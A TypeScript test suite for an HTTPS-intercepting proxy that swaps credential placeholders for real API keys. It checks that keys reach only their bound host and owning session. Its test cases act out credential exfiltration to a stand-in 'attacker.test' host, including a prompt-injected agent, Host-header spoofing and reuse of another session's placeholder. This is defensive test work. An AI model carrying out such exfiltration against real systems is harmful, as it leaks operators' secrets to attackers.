/**
 * TASK-687 — a credential placeholder is substituted ONLY on egress to a host it
 * is bound to, and ONLY for the session that owns it.
 *
 * Before this card the MITM path substituted ANY registered placeholder on ANY
 * host the caller's allowlist let through. The allowlist answers "where may this
 * session reach"; it says nothing about where a given operator-paid key may be
 * SENT — and users can widen their own allowlist (`proxy:add-host`, private
 * connectors) to a host they control. Prompt-injected agent + operator key +
 * a host the attacker controls == the key delivered to the attacker.
 *
 * These tests drive the REAL listener over real sockets against real TLS
 * upstreams. Distinct hostnames (`api.provider.test`, `attacker.test`) all
 * resolve to loopback via an injected resolver, each with its OWN upstream and
 * its own TLS leaf (the proxy verifies the upstream cert against SNI = the
 * CONNECT hostname). Every "not substituted" case asserts on the bytes the
 * upstream ACTUALLY RECEIVED, not on what the proxy says it did.
 *
 * Each test is written to fail against the pre-TASK-687 behaviour
 * (substitute-any-registered-placeholder-on-any-allowlisted-host, from any
 * session): the placeholder would reach the "attacker" upstream as the real
 * value.
 */

import { describe, it, expect, beforeAll, afterEach } from 'vitest';
import { createServer as tlsCreate, connect as tlsConnect, type TLSSocket } from 'node:tls';
import * as net from 'node:net';
import { ProxyAgent } from 'undici';
import forgeModule from 'node-forge';
import {
  startProxyListener,
  type ProxyAuditEntry,
  type ProxyListener,
  type SessionConfig,
} from '../listener.js';
import { CredentialPlaceholderMap, SharedCredentialRegistry } from '../registry.js';
import { generateDomainCert, type CAKeyPair } from '../ca.js';
import { basicAuth, rawConnect, tokenFor } from './proxy-auth-helpers.js';

const forge = forgeModule as typeof forgeModule;

const PROVIDER = 'api.provider.test';
const ATTACKER = 'attacker.test';
const REAL = 'sk-ant-REAL-operator-key-0123456789';

// ── Fixtures ─────────────────────────────────────────────────────────

function mintCA(): CAKeyPair {
  const keys = forge.pki.rsa.generateKeyPair(2048);
  const cert = forge.pki.createCertificate();
  cert.publicKey = keys.publicKey;
  cert.serialNumber = '01';
  cert.validity.notBefore = new Date();
  cert.validity.notAfter = new Date();
  cert.validity.notAfter.setFullYear(cert.validity.notBefore.getFullYear() + 1);
  const attrs = [
    { name: 'commonName', value: 'binding-test-ca' },
    { name: 'organizationName', value: 'AX Test' },
  ];
  cert.setSubject(attrs);
  cert.setIssuer(attrs);
  cert.setExtensions([
    { name: 'basicConstraints', cA: true },
    { name: 'keyUsage', keyCertSign: true, cRLSign: true },
  ]);
  cert.sign(keys.privateKey, forge.md.sha256.create());
  return {
    key: forge.pki.privateKeyToPem(keys.privateKey),
    cert: forge.pki.certificateToPem(cert),
  };
}

// One CA for the whole file: RSA keygen is the slow part, and the per-domain leaf
// cache in ca.ts is keyed by (domain, CA), so sharing it also shares the leaves.
let ca: CAKeyPair;
beforeAll(() => {
  ca = mintCA();
});

/** Every hostname resolves to loopback; each session's allowedIPs permits that. */
const loopbackResolver = async (): Promise<{ address: string; family: number }> => ({
  address: '127.0.0.1',
  family: 4,
});

interface UpstreamRequest {
  requestLine: string;
  /** Lower-cased header name → value (last one wins). */
  headers: Record<string, string>;
  /** The request's exact bytes (head + body), latin1-decoded. */
  raw: string;
}

interface Upstream {
  port: number;
  requests: UpstreamRequest[];
  /** EVERY byte this upstream received on any connection — the leak check. */
  received: () => string;
}

const cleanups: Array<() => Promise<void> | void> = [];
let listener: ProxyListener | undefined;

afterEach(async () => {
  if (listener) listener.stop();
  listener = undefined;
  for (const c of cleanups.splice(0)) await c();
});

/**
 * A keep-alive TLS upstream whose leaf cert is for `certHost` (the proxy dials it
 * with SNI = the CONNECT hostname, so that name must match). Records every
 * request on every connection; answers each with a tiny 200 so a real HTTP client
 * advances. The same helper serves the "provider" and the "attacker" — they are
 * distinguished only by cert host and port.
 *
 * `closeAfterResponse` makes it hang up after each response. The proxy writes its
 * CONNECT audit entry (the one carrying `credentialInjected`) only when a tunnel
 * closes, and in this harness a client-side close (undici `dispatcher.close()`,
 * or destroying a raw tunnel socket) produced no audit entry at all, so a test
 * that asserts on the audit has the UPSTREAM end the connection instead.
 */
async function startUpstream(
  certHost: string,
  opts: { closeAfterResponse?: boolean } = {},
): Promise<Upstream> {
  const leaf = generateDomainCert(certHost, ca);
  const requests: UpstreamRequest[] = [];
  let received = '';
  const sockets = new Set<net.Socket>();

  const server = tlsCreate({ key: leaf.key, cert: leaf.cert }, (sock) => {
    sockets.add(sock);
    sock.on('close', () => sockets.delete(sock));
    let buf = '';
    sock.on('data', (d: Buffer) => {
      const text = d.toString('latin1');
      received += text;
      buf += text;
      for (;;) {
        const headEnd = buf.indexOf('\r\n\r\n');
        if (headEnd === -1) return;
        const lines = buf.slice(0, headEnd).split('\r\n');
        const headers: Record<string, string> = {};
        for (const line of lines.slice(1)) {
          const idx = line.indexOf(':');
          if (idx === -1) continue;
          headers[line.slice(0, idx).trim().toLowerCase()] = line.slice(idx + 1).trim();
        }
        const bodyLen = parseInt(headers['content-length'] ?? '0', 10);
        const bodyStart = headEnd + 4;
        if (buf.length - bodyStart < bodyLen) return; // body still arriving
        requests.push({
          requestLine: lines[0] ?? '',
          headers,
          raw: buf.slice(0, bodyStart + bodyLen),
        });
        buf = buf.slice(bodyStart + bodyLen);
        if (opts.closeAfterResponse) {
          sock.end('HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK');
          return;
        }
        sock.write('HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK');
      }
    });
    // Swallow ECONNRESET etc. from tunnel teardown.
    sock.on('error', () => { /* abort-side errors are expected */ });
  });
  const port = await new Promise<number>((r) =>
    server.listen(0, '127.0.0.1', () => r((server.address() as net.AddressInfo).port)),
  );
  cleanups.push(
    () =>
      new Promise<void>((r) => {
        for (const s of sockets) s.destroy();
        server.close(() => r());
      }),
  );
  return { port, requests, received: () => received };
}

/** Poll until `cond` holds — the tunnel is async, so "the upstream got it" is an event. */
async function waitFor(cond: () => boolean, what: string, timeoutMs = 5_000): Promise<void> {
  const start = Date.now();
  while (!cond()) {
    if (Date.now() - start > timeoutMs) throw new Error(`timed out waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 10));
  }
}

function session(label: string, allowlist: string[]): SessionConfig {
  return {
    allowlist: new Set(allowlist),
    allowedIPs: new Set(['127.0.0.1']),
    sessionId: label,
    userId: `user-of-${label}`,
    classification: 'llm',
    proxyToken: tokenFor(label),
  };
}

/** A registry with one session whose credentials are `env → { value, hosts }`; returns its placeholders. */
function registerSession(
  registry: SharedCredentialRegistry,
  label: string,
  creds: Record<string, { value: string; hosts: string[] }>,
): Record<string, string> {
  const map = new CredentialPlaceholderMap();
  const placeholders: Record<string, string> = {};
  for (const [env, { value, hosts }] of Object.entries(creds)) {
    placeholders[env] = map.register(env, value, hosts);
  }
  registry.register(label, map);
  return placeholders;
}

async function startBound(
  registry: SharedCredentialRegistry,
  sessions: SessionConfig[],
): Promise<{ audits: ProxyAuditEntry[]; port: number }> {
  const audits: ProxyAuditEntry[] = [];
  listener = await startProxyListener({
    listen: { kind: 'tcp', host: '127.0.0.1', port: 0 },
    registry,
    ca,
    sessions: new Map(sessions.map((s) => [s.sessionId as string, s])),
    resolver: loopbackResolver,
    onAudit: (e) => audits.push(e),
  });
  return { audits, port: listener.port };
}

/**
 * Open a raw MITM tunnel to `hostname:upstreamPort` through the proxy, as the
 * session that owns `token`, and hand back the inner TLS socket so a test can
 * write hand-crafted HTTP/1.1 over it (Host-spoofing, Basic auth, keep-alive).
 * Resolves once the inner handshake against the proxy-minted leaf completes.
 */
async function openTunnel(
  proxyPort: number,
  hostname: string,
  upstreamPort: number,
  token: string,
): Promise<TLSSocket> {
  const raw = net.connect(proxyPort, '127.0.0.1');
  cleanups.push(() => {
    raw.destroy();
  });
  await new Promise<void>((resolve, reject) => {
    raw.once('error', reject);
    raw.once('connect', () => resolve());
  });
  raw.write(rawConnect(`${hostname}:${upstreamPort}`, token));
  await new Promise<void>((resolve, reject) => {
    let acc = '';
    const onData = (d: Buffer): void => {
      acc += d.toString('latin1');
      if (!acc.includes('\r\n\r\n')) return;
      raw.removeListener('data', onData);
      if (acc.startsWith('HTTP/1.1 200')) resolve();
      else reject(new Error(`CONNECT to ${hostname} was refused: ${JSON.stringify(acc)}`));
    };
    raw.on('data', onData);
    raw.once('error', reject);
  });
  const inner = tlsConnect({ socket: raw, servername: hostname, ca: ca.cert });
  inner.on('error', () => { /* teardown-side errors are expected */ });
  await new Promise<void>((resolve, reject) => {
    inner.once('secureConnect', () => resolve());
    inner.once('error', reject);
  });
  return inner;
}

/** Write one raw HTTP/1.1 request (Content-Length framed) over an open tunnel. */
function send(
  inner: TLSSocket,
  opts: { host: string; headers: Record<string, string>; body?: string; path?: string },
): void {
  const body = opts.body ?? '';
  const head = [
    `POST ${opts.path ?? '/v1/messages'} HTTP/1.1`,
    `Host: ${opts.host}`,
    ...Object.entries(opts.headers).map(([k, v]) => `${k}: ${v}`),
    `Content-Length: ${Buffer.byteLength(body)}`,
  ].join('\r\n');
  inner.write(`${head}\r\n\r\n${body}`);
}

/** A real HTTP client through the proxy (undici ProxyAgent), one tunnel per call. */
async function postVia(
  proxyPort: number,
  label: string,
  host: string,
  upstreamPort: number,
  headers: Record<string, string>,
): Promise<void> {
  const dispatcher = new ProxyAgent({
    uri: `http://127.0.0.1:${proxyPort}`,
    token: basicAuth(tokenFor(label)),
    requestTls: { ca: ca.cert },
  });
  try {
    const res = await fetch(`https://${host}:${upstreamPort}/v1/messages`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', ...headers },
      body: JSON.stringify({ hello: 'world' }),
      dispatcher,
    } as RequestInit);
    expect(res.status).toBe(200);
    await res.text();
  } finally {
    await dispatcher.close();
  }
}

// ─────────────────────────────────────────────────────────────────────

describe('credential binding — placeholder substituted only on its bound host, for its own session (TASK-687)', () => {
  it('THE LAUNCH BLOCKER: a provider key is substituted on its bound host and NEVER on another allowlisted host', async () => {
    const provider = await startUpstream(PROVIDER, { closeAfterResponse: true });
    const attacker = await startUpstream(ATTACKER, { closeAfterResponse: true });

    const registry = new SharedCredentialRegistry();
    const { ANTHROPIC_API_KEY: ph } = registerSession(registry, 's1', {
      ANTHROPIC_API_KEY: { value: REAL, hosts: [PROVIDER] },
    });
    // BOTH hosts are on the session's allowlist — exactly what `proxy:add-host`
    // produces when a user adds a host they control. The allowlist alone must not
    // make the key substitutable there.
    const { audits, port } = await startBound(registry, [session('s1', [PROVIDER, ATTACKER])]);

    await postVia(port, 's1', PROVIDER, provider.port, { 'x-api-key': ph! });
    await postVia(port, 's1', ATTACKER, attacker.port, { 'x-api-key': ph! });

    // Bound host: the real value.
    expect(provider.requests).toHaveLength(1);
    expect(provider.requests[0]!.headers['x-api-key']).toBe(REAL);
    expect(provider.received()).not.toContain('ax-cred:');

    // Unbound (but allowlisted, and reached — the request got a 200) host: the
    // placeholder VERBATIM, and the real value is nowhere in what it received.
    expect(attacker.requests).toHaveLength(1);
    expect(attacker.requests[0]!.headers['x-api-key']).toBe(ph);
    expect(attacker.received()).toContain(ph!);
    expect(attacker.received()).not.toContain(REAL);

    // The audit agrees: injection is recorded for the provider tunnel only.
    await waitFor(
      () => audits.filter((a) => a.method === 'CONNECT' && a.status === 200).length >= 2,
      'both CONNECT tunnel audits',
    );
    const auditFor = (host: string, upstreamPort: number): ProxyAuditEntry =>
      audits.find((a) => a.method === 'CONNECT' && a.url === `${host}:${upstreamPort}`)!;
    expect(auditFor(PROVIDER, provider.port).credentialInjected).toBe(true);
    expect(auditFor(ATTACKER, attacker.port).credentialInjected).toBeUndefined();
  });

  it('a spoofed inner `Host:` header does not move the binding — only the CONNECT target counts', async () => {
    const attacker = await startUpstream(ATTACKER);
    const registry = new SharedCredentialRegistry();
    const { ANTHROPIC_API_KEY: ph } = registerSession(registry, 's1', {
      ANTHROPIC_API_KEY: { value: REAL, hosts: [PROVIDER] },
    });
    const { port } = await startBound(registry, [session('s1', [PROVIDER, ATTACKER])]);

    // The tunnel goes to the attacker's server, but the request inside CLAIMS to
    // be for the provider. The bytes still land on the attacker.
    const inner = await openTunnel(port, ATTACKER, attacker.port, tokenFor('s1'));
    send(inner, { host: PROVIDER, headers: { 'x-api-key': ph! } });
    await waitFor(() => attacker.requests.length >= 1, 'the attacker upstream to receive the request');
    inner.destroy();

    const req = attacker.requests[0]!;
    expect(req.headers.host).toBe(PROVIDER); // the spoof really did travel
    expect(req.headers['x-api-key']).toBe(ph);
    expect(attacker.received()).not.toContain(REAL);
  });

  it("another session's placeholder is inert for the caller, even on the host it is bound to", async () => {
    const provider = await startUpstream(PROVIDER);
    const registry = new SharedCredentialRegistry();
    const A = registerSession(registry, 'sess-a', {
      ANTHROPIC_API_KEY: { value: 'sk-REAL-of-A', hosts: [PROVIDER] },
    });
    const B = registerSession(registry, 'sess-b', {
      ANTHROPIC_API_KEY: { value: 'sk-REAL-of-B', hosts: [PROVIDER] },
    });
    // B's allowlist includes A's bound host too: the ONLY thing separating them is
    // who owns the placeholder.
    const { port } = await startBound(registry, [
      session('sess-a', [PROVIDER]),
      session('sess-b', [PROVIDER]),
    ]);

    // 1. B presents A's placeholder (leaked into a shared transcript, say).
    const asB = await openTunnel(port, PROVIDER, provider.port, tokenFor('sess-b'));
    send(asB, { host: PROVIDER, headers: { 'x-api-key': A.ANTHROPIC_API_KEY! } });
    await waitFor(() => provider.requests.length >= 1, "B's request");
    expect(provider.requests[0]!.headers['x-api-key']).toBe(A.ANTHROPIC_API_KEY);
    expect(provider.requests[0]!.raw).not.toContain('sk-REAL-of-A');
    expect(provider.requests[0]!.raw).not.toContain('sk-REAL-of-B');

    // 2. A presents its own placeholder: substituted. (Proves the test above is
    //    about ownership, not about substitution being broken.)
    const asA = await openTunnel(port, PROVIDER, provider.port, tokenFor('sess-a'));
    send(asA, { host: PROVIDER, headers: { 'x-api-key': A.ANTHROPIC_API_KEY! } });
    await waitFor(() => provider.requests.length >= 2, "A's request");
    expect(provider.requests[1]!.headers['x-api-key']).toBe('sk-REAL-of-A');

    // 3. B presenting its OWN placeholder is substituted too.
    send(asB, { host: PROVIDER, headers: { 'x-api-key': B.ANTHROPIC_API_KEY! } });
    await waitFor(() => provider.requests.length >= 3, "B's own request");
    expect(provider.requests[2]!.headers['x-api-key']).toBe('sk-REAL-of-B');

    asA.destroy();
    asB.destroy();
  });

  it('git-shaped Basic auth: the placeholder inside the base64 blob is decoded only for a bound host', async () => {
    const provider = await startUpstream(PROVIDER);
    const attacker = await startUpstream(ATTACKER);
    const registry = new SharedCredentialRegistry();
    const { GITLAB_TOKEN: ph } = registerSession(registry, 's1', {
      GITLAB_TOKEN: { value: 'glpat-REALSECRET', hosts: [PROVIDER] },
    });
    const { port } = await startBound(registry, [session('s1', [PROVIDER, ATTACKER])]);

    const basic = Buffer.from(`x-access-token:${ph}`).toString('base64');
    const decode = (auth: string | undefined): string =>
      Buffer.from(auth!.replace(/^Basic /, ''), 'base64').toString('utf8');

    // Unbound host: the header is forwarded BYTE-IDENTICAL — still base64 of the
    // placeholder, not re-encoded, nothing decoded to the real credential.
    const toAttacker = await openTunnel(port, ATTACKER, attacker.port, tokenFor('s1'));
    send(toAttacker, { host: ATTACKER, headers: { Authorization: `Basic ${basic}` } });
    await waitFor(() => attacker.requests.length >= 1, 'the attacker to receive the Basic request');
    expect(attacker.requests[0]!.headers.authorization).toBe(`Basic ${basic}`);
    expect(decode(attacker.requests[0]!.headers.authorization)).toBe(`x-access-token:${ph}`);
    expect(attacker.received()).not.toContain('glpat-REALSECRET');
    expect(attacker.received()).not.toContain(
      Buffer.from('x-access-token:glpat-REALSECRET').toString('base64'),
    );

    // Bound host: decoded real credential (proves Basic substitution still works).
    const toProvider = await openTunnel(port, PROVIDER, provider.port, tokenFor('s1'));
    send(toProvider, { host: PROVIDER, headers: { Authorization: `Basic ${basic}` } });
    await waitFor(() => provider.requests.length >= 1, 'the provider to receive the Basic request');
    expect(decode(provider.requests[0]!.headers.authorization)).toBe(
      'x-access-token:glpat-REALSECRET',
    );

    toAttacker.destroy();
    toProvider.destroy();
  });

  it('two placeholders in one request head: only the one bound to the dialed host is substituted', async () => {
    const provider = await startUpstream(PROVIDER);
    const attacker = await startUpstream(ATTACKER);
    const registry = new SharedCredentialRegistry();
    const ph = registerSession(registry, 's1', {
      PROVIDER_KEY: { value: 'sk-REAL-provider', hosts: [PROVIDER] },
      ATTACKER_KEY: { value: 'sk-REAL-attacker', hosts: [ATTACKER] },
    });
    const { port } = await startBound(registry, [session('s1', [PROVIDER, ATTACKER])]);
    const headers = { 'x-api-key': ph.PROVIDER_KEY!, 'x-other-key': ph.ATTACKER_KEY! };

    const toProvider = await openTunnel(port, PROVIDER, provider.port, tokenFor('s1'));
    send(toProvider, { host: PROVIDER, headers });
    await waitFor(() => provider.requests.length >= 1, 'the provider request');
    expect(provider.requests[0]!.headers['x-api-key']).toBe('sk-REAL-provider');
    expect(provider.requests[0]!.headers['x-other-key']).toBe(ph.ATTACKER_KEY); // verbatim
    expect(provider.received()).not.toContain('sk-REAL-attacker');

    // …and the mirror image on the other host.
    const toAttacker = await openTunnel(port, ATTACKER, attacker.port, tokenFor('s1'));
    send(toAttacker, { host: ATTACKER, headers });
    await waitFor(() => attacker.requests.length >= 1, 'the attacker-bound request');
    expect(attacker.requests[0]!.headers['x-other-key']).toBe('sk-REAL-attacker');
    expect(attacker.requests[0]!.headers['x-api-key']).toBe(ph.PROVIDER_KEY); // verbatim
    expect(attacker.received()).not.toContain('sk-REAL-provider');

    toProvider.destroy();
    toAttacker.destroy();
  });

  it('a credential with an EMPTY binding is never substituted, even on an allowlisted host', async () => {
    const provider = await startUpstream(PROVIDER, { closeAfterResponse: true });
    const registry = new SharedCredentialRegistry();
    const { ANTHROPIC_API_KEY: ph } = registerSession(registry, 's1', {
      ANTHROPIC_API_KEY: { value: REAL, hosts: [] },
    });
    const { audits, port } = await startBound(registry, [session('s1', [PROVIDER])]);

    await postVia(port, 's1', PROVIDER, provider.port, { 'x-api-key': ph! });

    expect(provider.requests).toHaveLength(1);
    expect(provider.requests[0]!.headers['x-api-key']).toBe(ph);
    expect(provider.received()).not.toContain(REAL);
    await waitFor(
      () => audits.some((a) => a.method === 'CONNECT' && a.status === 200),
      'the tunnel audit',
    );
    expect(audits.find((a) => a.method === 'CONNECT')!.credentialInjected).toBeUndefined();
  });

  it('the binding matches case-insensitively, but a different host stays unsubstituted', async () => {
    const provider = await startUpstream(PROVIDER);
    const attacker = await startUpstream(ATTACKER);
    const registry = new SharedCredentialRegistry();
    // Bound with mixed case; the CONNECT target is lower-case.
    const { ANTHROPIC_API_KEY: ph } = registerSession(registry, 's1', {
      ANTHROPIC_API_KEY: { value: REAL, hosts: ['API.Provider.Test'] },
    });
    const { port } = await startBound(registry, [session('s1', [PROVIDER, ATTACKER])]);

    await postVia(port, 's1', PROVIDER, provider.port, { 'x-api-key': ph! });
    await postVia(port, 's1', ATTACKER, attacker.port, { 'x-api-key': ph! });

    expect(provider.requests[0]!.headers['x-api-key']).toBe(REAL);
    expect(attacker.requests[0]!.headers['x-api-key']).toBe(ph);
    expect(attacker.received()).not.toContain(REAL);
  });

  it('a tunnel that is already open stops substituting the moment its session is deregistered (live view)', async () => {
    const provider = await startUpstream(PROVIDER);
    const registry = new SharedCredentialRegistry();
    const { ANTHROPIC_API_KEY: ph } = registerSession(registry, 's1', {
      ANTHROPIC_API_KEY: { value: REAL, hosts: [PROVIDER] },
    });
    const { port } = await startBound(registry, [session('s1', [PROVIDER])]);

    // ONE keep-alive tunnel, two requests.
    const inner = await openTunnel(port, PROVIDER, provider.port, tokenFor('s1'));
    send(inner, { host: PROVIDER, headers: { 'x-api-key': ph! } });
    await waitFor(() => provider.requests.length >= 1, 'the first request');
    expect(provider.requests[0]!.headers['x-api-key']).toBe(REAL);

    // The session closes (its credentials are torn down) while the tunnel lives on.
    registry.deregister('s1');

    send(inner, { host: PROVIDER, headers: { 'x-api-key': ph! } });
    await waitFor(() => provider.requests.length >= 2, 'the second request');
    expect(provider.requests[1]!.headers['x-api-key']).toBe(ph); // verbatim
    expect(provider.requests[1]!.raw).not.toContain(REAL);
    inner.destroy();
  });
});
